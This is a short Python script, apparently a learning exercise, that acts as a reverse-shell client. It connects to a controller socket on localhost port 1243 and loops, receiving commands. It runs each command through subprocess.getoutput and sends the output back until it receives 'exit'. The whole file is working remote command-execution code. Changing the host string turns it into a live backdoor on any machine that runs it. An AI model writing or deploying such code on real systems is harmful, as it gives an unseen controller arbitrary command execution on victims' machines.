import socket
import subprocess

# Create socket with socket class.
slave = socket.socket()
host = "localhost"
port = 1243
slave.connect((host, port))

while True:
    command = slave.recv(1024).decode()
    print(command)

    # If the command is exit, close the connection.
    if command == "exit":
        break

    output = "output:\n"
    output += subprocess.getoutput(command)
    slave.send(output.encode())
slave.close()
